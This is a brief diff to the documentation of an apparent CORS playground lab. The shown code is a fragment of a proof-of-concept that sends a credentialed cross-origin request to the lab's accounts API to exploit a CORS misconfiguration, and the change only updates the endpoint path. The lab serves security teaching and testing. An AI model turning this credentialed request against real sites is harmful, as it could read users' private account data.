@@ -52,7 +52,7 @@ The following is an example of running CORS playground and exploiting CORS misco
    console.log(xhr.response);
   }
  }
- url = 'https://playground.cors.test:5555/api/accounts';
+ url = 'https://playground.cors.test:5555/api/v2/accounts';
  xhr.open('GET',url,true);
  xhr.setRequestHeader('CORS-playground','Penetration Testing Team');
  xhr.withCredentials = true;
